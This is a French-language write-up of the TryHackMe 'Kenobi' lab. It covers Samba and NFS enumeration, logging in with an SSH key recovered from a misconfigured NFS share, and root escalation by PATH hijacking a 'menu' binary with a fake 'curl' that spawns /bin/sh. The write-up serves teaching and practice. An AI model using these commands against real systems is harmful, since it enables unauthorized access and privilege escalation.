# 🤖 Kenobi

**Lien :** https://tryhackme.com/room/kenobi
**Catégorie :** Linux Privilege Escalation / Enumeration
**Date :** Juin 2026

## 🎯 Objectif

Énumérer les services exposés (Samba, NFS, FTP, port d'un binaire menu), récupérer une clé SSH privée via un partage NFS mal configuré, se connecter en tant qu'utilisateur `kenobi`, puis escalader vers root via une vulnérabilité de PATH hijacking sur un binaire personnalisé.

## 🛠️ Outils utilisés

- `nmap` (scan de ports + scripts NSE : `smb-enum-shares`, `nfs-showmount`, etc.)
- `smbclient` — énumération des shares Samba (contournement du bug de négociation SMB1 des scripts NSE)
- `mount` — montage du partage NFS en local
- `ssh` — connexion avec la clé privée récupérée
- PATH hijacking manuel — escalade de privilèges via le binaire `menu`

## 📝 Étapes

### 1. Énumération Samba (port 445/139)

Scan initial avec `nmap --script smb-enum-shares.nse,smb-enum-users.nse` → aucun résultat exploitable malgré les ports ouverts détectés.

**Problème rencontré :** le script NSE tente une négociation en **SMB1**, protocole refusé par le Samba de la machine (configuration durcie/moderne). Erreur typique :
```
Couldn't negotiate a SMBv1 connection: SMB: ERROR: Server returned less data than it was supposed to
```

**Solution :** contournement avec `smbclient` en connexion anonyme :
```bash
smbclient -L //<IP>/ -N
```
→ 3 shares trouvés : `print$`, `anonymous`, `IPC$`.

### 2. Énumération NFS (port 111)

```bash
nmap -p 111 --script=nfs-ls,nfs-statfs,nfs-showmount <IP>
```
- `rpcbind` (port 111) sert d'annuaire pour les services RPC, ici NFS.
- Identification d'un export NFS accessible (`/var`).

### 3. Mount du partage NFS

```bash
mkdir /mnt/kenobiNFS
mount -t nfs <IP>:/var /mnt/kenobiNFS
```
→ Le contenu distant devient navigable comme un dossier local (`cd`, `ls`, `cat`, etc.).

### 4. Récupération de la clé SSH

Une clé SSH privée a été trouvée accessible via le partage NFS monté (probablement déposée là via une faille du serveur FTP `ProFTPD` présent sur la machine — vecteur classique de cette room).

**Préparation de la clé avant utilisation :**
```bash
chmod 600 <cle>
```
Obligatoire : SSH refuse une clé privée trop permissive (lisible par d'autres utilisateurs), par sécurité.

### 5. Connexion SSH en tant que `kenobi`

```bash
ssh -i <cle> kenobi@<IP>
```
→ Accès shell utilisateur `kenobi`, récupération de `user.txt`.

### 6. Escalade de privilèges — PATH hijacking sur `menu`

Le binaire `/usr/bin/menu` (probablement SUID ou exécuté avec des droits élevés) appelle des commandes externes (`curl`, etc.) **sans chemin absolu**.

**Première tentative (échec) :**
```bash
echo /bin/sh > curl
chmod 777 curl
export PATH=/tmp:$PATH
/usr/bin/menu
```
→ Pas d'élévation : le faux `curl` avait été créé dans `~` (home) au lieu de `/tmp`, alors que le `PATH` modifié pointait en priorité vers `/tmp`. Le système a donc trouvé le vrai `/usr/bin/curl` en continuant sa recherche dans le PATH, sans jamais passer par le faux binaire.

**Correction :**
```bash
cd /tmp
echo /bin/sh > curl
chmod 777 curl
export PATH=/tmp:$PATH
/usr/bin/menu
```
→ Cette fois le faux `curl` se trouve bien à l'endroit où le PATH modifié cherche en premier. `menu` exécute `/tmp/curl` au lieu du vrai binaire → lance `/bin/sh` avec les privilèges de `menu` → shell root obtenu.

## 🔄 Erreurs de parcours

| Avant | Correction | Pourquoi ça aide |
|---|---|---|
| Utiliser `smb-enum-shares.nse` de nmap et conclure qu'il n'y a aucun share car le résultat est vide | Tester `smbclient -L //IP/ -N` en parallèle pour vérifier l'accès réel | Le script NSE échoue silencieusement sur les serveurs Samba modernes qui refusent SMB1 ; un résultat vide ne veut pas dire "rien à trouver", mais peut signifier "outil incompatible" |
| Créer le faux binaire `curl` dans le dossier courant (`~`, le home) en pensant que `export PATH=/tmp:$PATH` suffit | Toujours vérifier le dossier courant (`pwd`) et créer le fichier piège **directement dans le dossier ajouté au PATH** (`/tmp` ici) | `export PATH=/tmp:...` ne change que l'ordre de recherche des commandes, pas l'emplacement où les fichiers sont créés ; un hijacking PATH ne fonctionne que si le faux binaire est physiquement présent dans le dossier prioritaire |
| Croire que `PATH=/tmp:$PATH` (sans `export`) suffirait à influencer un autre programme lancé ensuite | Toujours utiliser `export` quand la modification doit être visible par des processus enfants | Sans `export`, la variable reste locale au shell courant et n'est jamais transmise aux programmes lancés à partir de lui — le PATH hijacking ne fonctionnerait jamais |

## 💡 Points clés à retenir

- Un script d'énumération qui ne renvoie rien n'est pas toujours synonyme d'absence de résultat — toujours croiser avec un outil alternatif (`smbclient`, `enum4linux`, `crackmapexec`) avant de conclure.
- NFS et Samba sont deux mécanismes de partage différents (Unix vs Windows à l'origine) mais avec une logique d'exploitation similaire : énumérer → monter/se connecter → explorer → récupérer.
- Le PATH hijacking exige une attention précise à **l'emplacement physique** du faux binaire, pas seulement à la variable `PATH` — une erreur de dossier (home vs `/tmp`) suffit à faire échouer toute la technique silencieusement.
- `chmod 600` sur une clé SSH récupérée n'est pas optionnel : c'est une exigence stricte du client SSH, indépendante des permissions d'origine sur la machine distante.
